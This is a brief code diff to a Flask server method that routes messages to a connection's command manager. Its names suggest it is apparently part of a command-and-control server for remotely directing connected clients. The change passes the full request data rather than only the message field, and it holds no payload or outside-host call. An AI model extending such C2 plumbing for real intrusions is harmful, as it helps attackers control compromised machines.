@@ -92,7 +92,7 @@ class FlskSevrev(object):
     def send_message(self):
         data = request.get_json()
         connObj = self.c2Server.connections.getConnObj(data['id'])
-        msg = connObj.commandManager.retriveCommand(data['message'])
+        msg = connObj.commandManager.retriveCommand(data)
         return {'message': msg}
     
    
